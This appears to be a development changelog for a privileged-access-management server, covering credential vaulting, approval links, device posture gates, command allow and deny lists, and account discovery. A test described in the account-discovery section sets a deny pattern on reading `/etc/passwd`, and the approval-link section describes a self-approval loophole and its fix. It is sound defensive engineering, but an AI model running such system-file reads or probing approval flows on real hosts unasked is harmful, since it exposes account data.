Server proxy connect path (`gates.go`) enforces the identical
access-control property — a plain admin without the capability is turned
away exactly the same way, proven end-to-end against a real upstream
(`TestPersonalSafeGateProxy`) — but does not yet add the extra audit line:
`admitResult` carries only a denial reason today, and threading a
success-side signal through it and all three proxies' gate-result
switches is real, separable plumbing this phase doesn't attempt.

**RoleAgent is unreachable, structurally, not by exemption.** The
broker's `authorizeAgentTarget`/`authorizeAgentCredential` also compute
`EffectiveSafePersonal` and pass it to `CanConnectTarget`, for
correctness — but `RoleAgent`'s fixed two-capability set (`read_inventory`,
`call_tool`) can never include `CapUnlimitedVaultAccess`, so the override
can never fire there.

**V1 scope.** A personal safe still requires `CapManageTargets` to create
(self-service creation is a bigger, separate access-model question).
Inventory *listing* (`GET /api/targets`, `GET /api/credentials`) is
unaffected — a personal safe's target/credential metadata (name, username,
existence) stays visible to any `read_inventory` holder exactly like any
other safe's; only the paths that actually hand back or use the secret
(connect, reveal, checkout) are gated. Deleting or renaming a safe
(`DELETE`/`PUT /api/safes/{id}`) stays `CapManageTargets`-gated
unconditionally, unchanged from before this phase — a destructive/
lifecycle action, not a confidentiality one, and out of scope for what
"personal" protects.

New capability `unlimited_vault_access`; new audit action
`safe.personal_override_used`; new migration `0040`; no new route (`personal`/
`owner` ride the existing `POST /api/safes`).

**Critical files:** `internal/auth/auth.go` (`CapUnlimitedVaultAccess`,
`CanConnectTarget`, `PersonalOverrideUsed`), `internal/store/personalsafe.go`
(new, `EffectiveSafePersonal`), `internal/store/store.go` (`Safe.Personal`),
`internal/api/safes_handlers.go` (`createSafe`, `canManageSafe`),
`internal/api/targets.go` (`authorizedForTarget`), `internal/api/viewer_handlers.go`,
`internal/api/broker_tools.go`, `internal/proxy/gates.go`, new migration `0040`.

## Phase 138 — v0.32.0 ✅

Releases Phase 137 (magic-link approval + session watermarking) — a genuine
minor: two new capabilities. Schema change (migration `0039`).

- [x] **v0.32.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-15 as `ghcr.io/morandeirachema/pamv1:0.32.0` (also
  `latest`), digest
  `sha256:c07fc2d0e7dc592e0a4df897122814a0e3d34305deab7d6cebde85ca414977e7`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.22.0 -> **0.23.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively; the top-banner "Phases 0–N are shipped" line, missed
  in Phase 137's own sweep, caught here too
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 137 — Magic-link approval + session watermarking ✅

Fourth phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Two small,
independent items bundled for efficiency, the same shape as Phase 120
bundling three small policy gaps — closes BeyondTrust's out-of-band approval
(the buildable "link" half, not the native mobile app) and BeyondTrust's
session watermarking.

**Magic-link design: a near-structural copy of Phase 116's own pattern.**
A new `store.ApprovalInvite` type and a 7-method `ApprovalInviteStore` role
(store surface 174 → 181) mirror `SessionShareInvite` almost exactly, down
to reusing `newShareToken()` verbatim for single-use minting. The one real
difference: unlike a session share, minting an approval invite needs no
separate approval step of its own — creating one already requires
`CapApprove`, so the invite **is** the delegation, not a request for one.

**One deliberate deviation from `share.html`'s own precedent, reasoned
explicitly.** `share.html` fires its redeem `POST` automatically on page
load — fine for joining an already-approved session, but approving or
denying an access request is a materially higher-stakes action, one that
must never be triggerable by a mail client's link-prefetcher visiting the
URL. Redemption is split into two calls instead: `previewApprovalInvite`
(`GET /api/approval/preview/{token}`), a safe, non-consuming lookup the
page loads immediately so a prefetch learns nothing and changes nothing;
and `redeemApprovalInvite` (`POST /api/approval/redeem/{token}`), the
single-use, state-changing decision, fired only from an explicit
Approve/Deny button click on `approve.html`.

**A real self-approval vulnerability, found by tracing the attack, not by
a failing test.** The first-draft design assumed the redeem path's
synthetic `"magiclink:<email>"` actor was enough to prevent self-approval,
since it can never equal a real principal's own actor string —
`decideAccessRequest`'s existing four-eyes check (`ar.Requester ==
approver`) would never trip against it. Deliberately tracing an actual
attack scenario before writing tests surfaced the hole: nothing stopped
the **requester** from creating an invite addressed to their own inbox and
redeeming it themselves — the synthetic actor is different from `"alice"`
regardless of whose email address ends up inside it. Fix: a second,
independent four-eyes check at invite **creation** time, in
`createApprovalInvite` (`ar.Requester == actorFrom(r.Context())` refuses
with 403, audited `access.decision_denied` with
`reason:self-approval-invite`) — closing the loophole regardless of which
address the invite names. `TestApprovalInviteCannotSelfApprove` proves it,
including against a principal holding both `CapConnect` and `CapApprove`
at once.

**`decideAccessRequest` refactored for reuse, not duplicated.** The
existing `approveAccessRequest`/`denyAccessRequest` handlers derived their
`id` from the URL and their `approver` from `actorFrom(r.Context())`
internally — the magic-link path needs to supply both explicitly (an `id`
read off the just-consumed invite, a synthetic `approver`), so the
function's signature became `(w, r, id int64, decision, approver string)
bool`, with the two REST handlers now parsing `id` and passing
`actorFrom(r.Context())` themselves. The `bool` return tells the redeem
handler whether to record an outcome on the invite itself — the underlying
request may already have been decided by someone else in a race, in which
case the invite's own record stays best-effort.

**A route-collision panic, found by the test suite, not the build.**
`POST /api/approval-invites/{id}/revoke` and a first-draft
`POST /api/approval-invites/redeem/{token}` are ambiguous Go 1.22+
`ServeMux` patterns. `go build ./...` is silent about it — server
construction never runs at build time — but `go test ./...` panics at
server construction in every package that builds one, `cmd/pam-server`'s
end-to-end test and `internal/api`'s own suite included. Fixed by
reapplying the exact precedent this codebase already set for the identical
shape (`share` vs. `share-invites`): the unauthenticated preview/redeem
routes moved to their own `/api/approval/` prefix —
`GET /api/approval/preview/{token}`, `POST /api/approval/redeem/{token}`
— leaving `POST /api/approval-invites/{id}/revoke` on the
authenticated-CRUD prefix. A reminder to run the full test suite, not just
`go build`/`go vet`, before trusting a routing change.

**Watermarking design: two mechanically separate hooks.** RDP/VNC gets a
client-side DOM overlay — `buildWatermark(targetName)` in `index.html`
builds a `.rdpwatermark` element (operator name, target, timestamp, set via
`.textContent` only, so it carries no XSS risk) appended as a sibling of
the Guacamole canvas mount point, `pointer-events: none` so it never
intercepts input. SSH/PostgreSQL/SQL Server sessions get a one-time
identity banner instead, published through `Hub.Publish` — the exact
mechanism `execWinRM` already uses to inject its own notices into a
live-watched stream — right after session registration, in all three
proxies, via one small shared helper: `internal/proxy/watermark.go`'s
`watermarkBanner(actor, targetName string) []byte`.

**V1 scope.** Approval links are single-use and `PAM_APPROVAL_INVITE_TTL_MIN`-
bounded (default 1440 minutes/24h — deliberately closer in profile to a
password-reset link than to Phase 116's 15-minute live-session-join link,
since an approval decision has no live session on the other end to time
out). No native mobile app. Watermark text is static identity, not a
dynamic per-frame tracking pattern. New audit actions
`access.invite_created`/`access.invite_revoked` (plus the existing
`access.decision_denied`, reused for the self-approval-at-creation refusal,
within the family it already belongs to); no new action for
watermarking — it is a display/banner concern, not a decision.

**Critical files:** `internal/store/store.go` (`ApprovalInvite`,
`ApprovalInviteStore`), `internal/api/approvalinvite_handlers.go` (new),
`internal/api/approval_handlers.go` (`decideAccessRequest` signature
change), `internal/api/server.go` (routes, `ApprovalInviteTTL` wiring),
`internal/config/config.go` (`PAM_APPROVAL_INVITE_TTL_MIN`),
`internal/proxy/watermark.go` (new), `internal/proxy/proxy.go`/`dbproxy.go`/
`mssqlproxy.go` (one `Hub.Publish` call each), `internal/web/web.go` +
`internal/web/static/approve.html` (new), `internal/web/static/index.html`
(viewer overlay), new migration `0039`.

## Phase 136 — v0.31.0 ✅

Releases Phase 135 (DoubleLock) — a genuine new capability, so this is a
**minor**, not a patch. Schema change (migration `0038`).

- [x] **v0.31.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-15 as `ghcr.io/morandeirachema/pamv1:0.31.0` (also
  `latest`), digest
  `sha256:7bb703d85e1dc98b2a0678e83340baf24b9df9eb42ce15c3b3eaf3d1fc3dc478`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.21.0 -> **0.22.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 135 — DoubleLock: a per-credential second password ✅

Third phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
Delinea's DoubleLock/QuantumLock: a named person's password, independent of
RBAC, additionally required to reveal or check out a credential's plaintext
— so even a compromised admin account can't read a Double-Locked secret
alone.

**The plan's original mechanism didn't survive contact with `-rotate-kek`,
and the fix is the interesting part of this phase.** The plan called for
mixing a hash of the password into the AAD passed to the *existing*
`vault.Encrypt`/`Decrypt` — cheap, and it would have worked for reveal and
checkout in isolation. But `internal/maint/rotate.go`'s `-rotate-kek` re-
wraps every KEK-protected artifact **exhaustively** (its own doc comment
recounts the exact incident: key custody was added in Phase 42, the
rotation forgot about it, and the server came back up unable to decrypt a
fourth of what it needed to) — and it has no way to obtain a credential's
DoubleLock password to redo that AAD mid-rotation. Baking the password into
an AAD checked by a KEK-wrapped ciphertext would have meant every DoubleLock
either silently breaks on the next KEK rotation, or `-rotate-kek` must grow
a way to prompt for passwords it was never designed to ask for — the same
shape of problem this codebase already has an honest answer for: sealed
session recordings, which *also* carry KEK-wrapped material `-rotate-kek`
cannot reach, and are handled by documenting the limitation and requiring
the old KEK to be retained, not by pretending the rotation is exhaustive
when it isn't.

**Fix: keep DoubleLock's ciphertext outside the KEK entirely.**
`DoubleLockEnc` is a *second*, independent encryption of the same secret —
raw AES-256-GCM keyed directly by PBKDF2(password), never touching
`vault.Encrypt`, never wrapped by any KEK. `-rotate-kek`'s exhaustive
"four kinds" list (`internal/maint/rotate.go`) needed **zero changes**: from
its perspective `DoubleLockEnc` simply doesn't exist, because it was never a
KEK-protected artifact to begin with. This is arguably a *stronger*
security property than the original plan too — a compromised KEK provides
literally no help decrypting `DoubleLockEnc`, versus "the AAD it's gated on
happens to be hard to guess."

**The rest of the design still matches the plan's shape.** `SecretEnc`
itself is never touched — the session-proxy JIT-decrypt path always uses
it, standard AAD, unmodified, so a Double-Locked credential still connects
through the proxy exactly like any other (the operator never sees the
plaintext there either way; DoubleLock protects the two paths that *do*
hand plaintext to a caller — reveal and checkout). A new
`Credential.DoubleLockHolder` (migration `0038`) names who holds the
password, never the password itself. Since a raw AEAD `Open` failure
doesn't distinguish "wrong key" from "corrupted ciphertext" any more than
`vault.Decrypt`'s single `ErrInvalidToken` does, a separate salted PBKDF2
verifier is checked first — the plan's own concern, solved the same way
regardless of which primitive ended up doing the real decryption.
**Rotation clears DoubleLock** (a real, deliberate v1 limitation, not an
oversight): `RotateCredentialSecret` — the actual secret-changed path, as
opposed to `UpdateCredentialSecretEnc`'s KEK-re-wrap-only path, which
leaves DoubleLock untouched — now also clears it at the store layer, since
the password to reseal a *new* secret isn't available there; the holder
re-enables it afterward if still wanted.

**Disabling DoubleLock requires the password too** — the one design point
that actually matters for the threat model. If any `CapRevealSecret` holder
could strip DoubleLock without the password, the feature would be theater:
the entire promise is that an admin *alone* cannot read the secret, and that
has to include not being able to simply turn the protection off.

New routes `POST`/`DELETE /api/credentials/{id}/doublelock`. New audit
actions `credential.doublelock_enabled`/`_disabled`/`_denied`, within the
existing `credential.*` family.

**V1 scope.** One password, one named holder (a free-text label — a name or
a comma-separated set — not a link to a real `store.User` row). No
DoubleLock chaining, no QuantumLock post-quantum variant, no safe-level
cascading (the plan's own "(or per safe...)" was framed as an alternative
scope, not an addition).

**Critical files:** `internal/api/doublelock.go` (new), `internal/api/credentials.go`,
`internal/api/lifecycle_handlers.go` (checkout), `internal/api/server.go`,
`internal/store/store.go`, `internal/store/pgstore/pgstore.go`,
`internal/store/memstore/memstore.go`, new migration `0038`.
`internal/vault/vault.go` and `internal/maint/rotate.go`: unchanged, and
staying unchanged is the point.

## Phase 134 — v0.30.0 ✅

Releases Phase 133 (device-aware access control) — a genuine new
capability, so this is a **minor**, not a patch. Schema change (migration
`0037`).

- [x] **v0.30.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.30.0` (also
  `latest`), digest
  `sha256:752bee357ccb1e0c4553ef4abaf160a1cc1f7ca212b7d03a2162e3def9111ad9`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.20.0 -> **0.21.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 133 — Device-aware access control (posture + client identity) ✅

Second phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
StrongDM's live EDR-posture gate and a rescoped, honestly-buildable version
of Teleport's device-identity binding — bundled because both slot into the
same extension point (a new per-connect check in `gates.go` and the REST
`authz` middleware, right where Phase 118's CIDR gate already sits) even
though the two mechanisms differ.

**Posture design.** A pluggable webhook, `internal/posture`, copying Phase
29's `vendor.Attestor` shape almost exactly (`NewAttestor(url)` → `nil` when
unconfigured, POST `{"user":...}`, non-2xx-is-failure, an 8s timeout) — but
called on **every connect and every authenticated call**, like the CIDR
gate itself, not once at approval time like the vendor webhook is, since
posture (unlike employment) can change between one request and the next. A
new gate 6 in `gates.go`'s fixed sequence (renumbering 6–15 to 7–16) and a
matching check in `authz`, both break-glass-exempt. `PAM_POSTURE_ATTEST_URL`
is a live outbound endpoint, so it also joins the `PAM_OT_AIRGAP` conflict
list (`airGapConflicts` in `internal/config/config.go`) alongside the
vendor/ITSM/SIEM/OIDC/Conjur/alert webhooks — an air-gapped deployment that
sets it without declaring it in `PAM_OT_AIRGAP_ALLOW` is refused at startup,
the same control every other outbound-URL knob already gets.

**Device-identity design, rescoped from "TPM" to what's actually
buildable.** pamv1 has zero client-facing TLS/mTLS termination on any of
its three session proxies today, and no client-side story for presenting a
hardware-backed key at all — true device attestation is its own
multi-phase undertaking, not this one. V1 instead trusts an **optional,
reverse-proxy-injected client-certificate fingerprint header**
(`PAM_DEVICE_HEADER` names it; the common nginx/Envoy mTLS-terminated-
upstream pattern), bound to a principal at enrollment time
(`store.User.DeviceFingerprint`, migration `0037`, mirroring
`IPAllowlist`'s exact shape — same v1 scope limit too: sourced only for a
local bearer-token identity, since a directory-authenticated principal has
no `store.User` row to source it from) and checked the same per-call way
posture is. Honest about what it actually verifies (the reverse proxy did
mTLS and pamv1 trusts its header) rather than claiming a hardware-
attestation guarantee it can't back up alone — the doc comment on
`Config.DeviceHeader` says this explicitly, including that pamv1 trusts the
header's value verbatim and the reverse proxy must strip any client-
supplied copy of it.

**A real scope boundary found building this, not assumed going in:**
device-identity is wired into the REST `authz` middleware only — **not**
`gates.go`'s `admit()`. The three session proxies (SSH, PostgreSQL, SQL
Server) are raw TCP/wire-protocol listeners with no HTTP layer at all, so
there is no request for a reverse proxy to inject a header into; a
`PAM_DEVICE_HEADER` deployment therefore covers the REST-brokered surface
(RDP/VNC token minting, WinRM exec, account discovery, and every
`authz`-gated call) but not a raw SSH/`psql`/`sqlcmd` connection, a
permanent transport-level limitation rather than a corner cut. Posture has
no such boundary — it needs no header, only the identity already resolved
on any transport — so it covers all three proxies AND the REST surface
symmetrically, gate 6 in `gates.go` plus the `authz` check.

**RoleAgent is structurally unaffected by both**, not by a special-cased
exemption: the broker's `ssh_exec`/`winrm_exec` tools run over
`rotate.SSHConnector`, a separate one-shot path that never calls
`admit()`, and an agent identity is resolved via SPIFFE SVID through
`agentAuth`, never through `authz` at all — so neither new gate has a code
path by which a `RoleAgent` principal could ever reach it. See
[AGENT-THREAT-MODEL.md](docs/AGENT-THREAT-MODEL.md).

**V1 scope.** Both checks are opt-in per deployment (unset = today's
behavior, unchanged) and per-principal for device-identity (an empty
`DeviceFingerprint` is unbound even when the header mechanism is globally
enabled). No live interop test against a real CrowdStrike/Duo/Defender/
SentinelOne account — proven against a fake webhook, matching how Phase
29's vendor webhook itself is tested, plus a real in-process sshd
end-to-end (`TestPostureGateProxy`).

New env vars `PAM_POSTURE_ATTEST_URL`, `PAM_DEVICE_HEADER`. New audit
reasons `reason:posture-check-failed` and `reason:device-not-trusted`
under the existing `authz.denied`/`session.denied`/`db.session.denied`
action families — no new action name.

**Critical files:** `internal/posture/` (new), `internal/proxy/gates.go`,
`internal/api/server.go` (`authz`), `internal/auth/auth.go` (`Principal`),
`internal/store/store.go` (`User.DeviceFingerprint`), `internal/api/users.go`,
`internal/config/config.go` (incl. the air-gap conflict list), all three
proxy `Config` structs, `cmd/pam-server/main.go`, new migration `0037`.

## Phase 132 — v0.29.0 ✅

Releases Phase 131 (command allow-listing) — a genuine new capability, so
this is a **minor**, not a patch. No schema change.

- [x] **v0.29.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.29.0` (also
  `latest`), digest
  `sha256:f203f30a9ff93b5885b3b15bb4e7bfd47771d1cb1f925cdfe72ab1177b2dea1a`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.19.0 -> **0.20.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 131 — Command allow-listing for human sessions ✅

Closes Delinea's SSH Command Menus gap: `internal/cmdguard` was denylist-only
by design (its own doc comment said so), and the codebase's one real
allow-list engine (`internal/policy`) is wired to the AI-agent broker's typed
tool-call arguments only — bridging it to a human operator's raw command
string would mean inventing a command tokenizer nothing in this codebase
needs otherwise.

**Design.** `cmdguard.Guard` gains a second method, `Allowed(cmd string)
bool`, reading the exact same compiled `patterns []*regexp.Regexp` field
`Blocked` already reads — zero changes to `New`, `ParseDeny` or
`ErrNoPatterns`. A new `PAM_COMMAND_ALLOW_FILE` env var (sibling to
`PAM_COMMAND_DENY_FILE`, identical fail-loud-on-bad-pattern loading) is
wired in `main.go` into a second, independent `*cmdguard.Guard` value —
never a mode flag on the existing one — threaded alongside `CommandGuard`
at every call site that already carries it: both SSH-proxy exec paths
(the broker-tool `onExec` hook, the interactive WinRM-loop `winrmRun`),
both DB proxies via `sqlPolicy.allowGuard`, and the REST/broker shared
`guardCommand`. Each site adds one refusal branch after its existing deny
check — `!blocked && allowGuard != nil && !allowGuard.Allowed(cmd)` — so
deny always wins when both would match, and a deployment that never sets
`PAM_COMMAND_ALLOW_FILE` stays byte-for-byte deny-only. An allow-list
refusal audits the existing `command.blocked` action with a
`pattern:not-allowed` detail, distinguishable from a deny-pattern match
without inventing a new action name. `sftpguard.go`'s path-denylist and
`sqlPolicy.stepupGuard` are deliberately untouched — different concerns
that happen to share the same regex engine.

**Proven end-to-end**, not mocked: `TestProxyExecAllowList` (real
in-process sshd), `TestDBProxyCommandAllowList` (real Postgres
wire-protocol fake), `TestWinRMRunCommandAllowList` (REST) — each proving
all three cases in one run: an allow-listed command succeeds, a command
matching neither list is refused as `not-allowed`, and a command matching
both is still refused (deny wins).

**V1 scope.** Literal/regex allow patterns, matching Delinea's actual
mechanism — a friendly-name-to-command label is a console presentation
concern, not a policy-engine one, and isn't attempted here.

**Critical files:** `internal/cmdguard/cmdguard.go`, `internal/config/config.go`,
`cmd/pam-server/main.go`, `internal/api/server.go`, `internal/proxy/proxy.go`,
`internal/proxy/dbproxy.go`, `internal/proxy/mssqlproxy.go`,
`internal/proxy/sqlproxy.go`, `internal/api/credentials.go`.

## Phase 130 — v0.28.0 ✅

Releases Phases 128 (authenticated post-login account discovery) and 129
(Zero Standing Privilege for PostgreSQL) together — both banked unreleased
while the fresh BeyondTrust/Delinea/Teleport/StrongDM gap research and the
resulting 15-phase plan were being worked through. A genuine **minor**
(two new capabilities), schema change (migration `0036`).

- [x] **v0.28.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.28.0` (also
  `latest`), digest
  `sha256:30eb91806df2052e3a2d80f0de97839b94723dad92a01dfd5ee2dca1ecafec9a`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.18.0 -> **0.19.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the new Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 129 — Zero Standing Privilege for PostgreSQL ✅

First phase of a 15-phase batch drawn from a fresh gap-research pass against
BeyondTrust, Delinea, Teleport and StrongDM — the vendors README.md names as
comparison points but neither of the two prior research rounds this session
covered. Extends Phase 22's SSH-only Zero Standing Privilege to databases:
StrongDM's RDP cert-based ZSP and Teleport's ephemeral-DB-user provisioning
were the two findings behind this phase; RDP turned out not to be
achievable at all (see below) and SQL Server was cut for its own honest
reason, so what shipped is the database half, PostgreSQL only.

**RDP cut before any implementation code was written.** No live guacd/Docker
daemon was available in this environment to run a real protocol handshake,
so the go/no-go check this phase opened with was done against Apache
Guacamole's own official documentation instead: the full RDP parameter list
has no client-certificate or smartcard authentication parameter — only
`username`/`password`/`domain` (plus `gateway-*` equivalents) and
server-certificate-trust settings (`ignore-cert`/`cert-tofu`/
`cert-fingerprints`, which govern the *client* trusting the *server's*
cert, the opposite direction). A second page, "Signing in with smart cards
or certificates," looked promising but turned out to be a different
mechanism entirely — a reverse-proxy-terminated client cert used to log
into Guacamole's own web frontend (`guacamole-client`), which pamv1 doesn't
use at all (pamv1 talks to guacd directly), and even that path still
requires a separate username/password/domain for the RDP connection
afterward. **Conclusion: RDP certificate-based ZSP is not achievable with
guacd/FreeRDP as they exist today** — a confirmed, permanent protocol
limitation, not an infrastructure gap a bigger test rig would resolve.

**SQL Server deferred for a second, different honest reason, found building
the database half.** Postgres has a rich client-side wire-protocol library
already vendored (`jackc/pgx/v5/pgproto3` — `dialUpstream`'s own
`*upstreamPG.fe` is already a full `pgproto3.Frontend`), so pamv1 issuing
its own `CREATE ROLE`/`DROP ROLE` as a client and reading the real server's
response needs no new wire-level code, just a normal `Query` message send +
response loop. SQL Server has no equivalent: `internal/tds` is entirely
built for pamv1 acting as a TDS *server* (parsing what an operator's client
sends, encoding what pamv1 sends back) — there is no existing code for
pamv1 acting as a TDS *client* parsing a real server's response token
stream (COLMETADATA/ROW/DONE/error tokens), which `CREATE LOGIN`'s result
would need. Building that reader from scratch, calibrated to be
trustworthy for something this security-sensitive, is real, separate work —
not a corner to cut into this phase.

**Design.** A new `store.SecretTypeDBZSP` ("db_zsp") joins `SecretTypeSSHCA`
under the existing `IsZSP()` predicate — neither stores a secret. A new
`Credential.Provisioner bool` (migration `0036`, `credentials.is_provisioner`)
marks the one real, stored, elevated credential per target eligible to run
the DDL a db_zsp dial needs; `dbproxy.go`'s `admitRequest` gains
`skipDecrypt: func(c) bool { return c.IsZSP() }` (previously only the SSH
proxy set this hook). At connect time: `findProvisioner` resolves the
target's one `Provisioner` credential — zero or more than one refuses the
connect, fail-closed, never guessed at — `provisionPGRole` dials it via the
*existing* `dialUpstream` and issues `CREATE ROLE %s WITH LOGIN PASSWORD %s
VALID UNTIL %s` (a 30-minute hard-ceiling expiry, a safety net independent
of teardown succeeding) as pamv1's own PostgreSQL client (`pgSimpleExec`, a
plain `Query` send + response-loop, distinct from the relay path which
never originates a statement itself). Role name and password are
`crypto/rand`-generated hex, never client input, so the string-built DDL
(`pgQuoteIdent`/`pgQuoteLiteral`, standard SQL doubled-quote escaping) is
not an injection surface — verified anyway by dedicated unit tests. The
real session then dials again as that fresh role; teardown (`DROP ROLE`,
best-effort audited on failure — its `VALID UNTIL` safety net covers a lost
teardown call) is registered in its own `defer` at the moment provisioning
succeeds, deliberately not folded into the later session-lifecycle defer,
since a failed dial or a required-recording refusal between provisioning
and relay would otherwise leak the role for the rest of its window.

**Proven end-to-end**, not mocked: a dedicated fake Postgres upstream
(`fakePGProvisioner`, distinct from the shared single-password
`fakePostgres` other DB-proxy tests use) parses the `CREATE ROLE`/`DROP
ROLE` statements the proxy issues to learn the dynamically-generated
ephemeral credential and accept a second, different login with it in the
same test run — proving the operator's real session actually runs as the
newly minted role, never the provisioner's own credential. Plus fail-closed
tests for the no-provisioner and ambiguous-provisioner cases.

**V1 scope, explicitly bounded.** PostgreSQL only. One provisioner
credential per target, required to exist before db_zsp can be used — no
auto-discovery of superuser credentials. Console unchanged: `db_zsp`/
provisioner credentials are curl/API-only, matching the existing precedent
that `ssh_ca` credentials were never addable through the console either.

New audit actions `db.zsp_provisioned`/`db.zsp_provision_failed`/
`db.zsp_teardown`/`db.zsp_teardown_failed`.

**Critical files:** `internal/proxy/dbzsp.go` (new), `internal/proxy/dbproxy.go`,
`internal/store/store.go` (`SecretTypeDBZSP`, `Credential.Provisioner`),
`internal/store/pgstore/pgstore.go`, `internal/api/credentials.go`,
`internal/api/targets.go`, new migration `0036`.

## Phase 128 — Authenticated post-login account discovery ✅

With the Wallix-weighted plan (116–126) fully released as of Phase 127,
returns to the original CyberArk/Wallix competitive-research backlog's
remaining item (see [[cyberark-wallix-gap-research]] in memory, or
README.md's Tier-5 table before this phase): CyberArk DNA enumerates
local/service accounts and flags credential exposure on hosts already
reached. `internal/discovery` (Phase 7) only ever TCP-probed for reachable
management ports, pre-auth — this is the authenticated counterpart.

**New pure package, `internal/accountscan`.** `ParseUnixAccounts` extracts
login-capable accounts from `/etc/passwd` text (root, or uid ≥ 1000 on the
Debian/Ubuntu convention this project's own OVA and Docker images use;
system accounts and nologin shells are skipped as noise). `ParseWindowsAccounts`
extracts `net user`'s fixed-width account listing and cross-marks each
against a `net localgroup Administrators` member listing. Neither function
does any I/O or touches the store — both are unit-tested directly against
fixed sample text, including a degraded case (the admins listing failed or
is empty: accounts still come back, just none marked privileged, rather than
losing the whole scan).

**New `POST /api/targets/{id}/discover-accounts` (`manage_targets`).** Loads
the target's first vaulted credential, decrypts it just-in-time
(`vault.Decrypt`/`store.CredentialAAD`, the same call every other secret-use
path makes), and runs the fixed command over a **fresh, one-shot** connection
— `rotate.SSHConnector.Exec` for SSH, `winrm.Runner.Run` for WinRM — the
exact shape the broker's own `ssh_exec`/`winrm_exec` tools and
`rotate`'s own reconciliation already use, never the live interactive
session (reusing that would need new plumbing with no existing precedent).
Every discovered username is cross-referenced against **all** credentials
already vaulted for that target, not just the one used to authenticate the
scan — an account with no match comes back `"managed":false`, the finding
this phase exists to surface.

**Every command goes through `guardCommand` first**, the same chokepoint
every other discrete pamv1-run command passes through (Phase 38's "every
path where a discrete command is visible obeys one policy") — pamv1's own
fixed literal commands are not exempt from an operator-configured deny
pattern, proven by a dedicated test that configures a deny pattern matching
`cat /etc/passwd` and confirms the scan is refused, not silently bypassed.

**Deliberately not built on `execWinRM`.** That existing helper (shared by
the REST WinRM endpoint and the broker's `winrm_exec` tool) couples command
execution to the live-session registry, `PAM_REQUIRE_RECORDING`, and
live-watch publishing (`s.live.Publish`) — correct for a supervised,
recorded operator session, wrong for a `manage_targets` background scan that
isn't a session at all. This phase calls `guardCommand`/`vault.Decrypt`/
`winrm.Run` directly instead — the same underlying primitives, with none of
the session/recording coupling `execWinRM` exists to provide.

**V1 scope, explicitly bounded.** SSH and WinRM only — RDP/VNC/PostgreSQL/
SQL Server have no discrete command-execution surface pamv1 already speaks.
Unix privilege detection is UID-based only (root); group-membership
awareness (sudo/wheel) is a reasonable follow-on, not attempted here. A
target needs at least one already-vaulted credential to authenticate the
scan itself — there is no bootstrap path around that, matching every other
credential-using feature in this codebase.

**Console:** menu 1 (*Work with Targets*), option **9=Discover accounts**
(shown to `manage_targets` holders) opens a new `acctscan` results screen —
account name, privileged (amber if yes), managed (green/red). Extending
`console_check.js` to this new screen used `cell()` (bounded) for the
account-name column from the very first commit, rather than `pad()`
(unbounded) — the class of bug found and fixed in Phases 110/118/120×2/122
this session, this time avoided rather than caught after the fact.

New audit actions `target.accounts_scanned`/`target.accounts_scan_failed`
(§5), both plain `s.audit` — informational activity logging, the same tier
as `winrm.error`, not the fail-closed tier `credential.decrypt_failed` sits
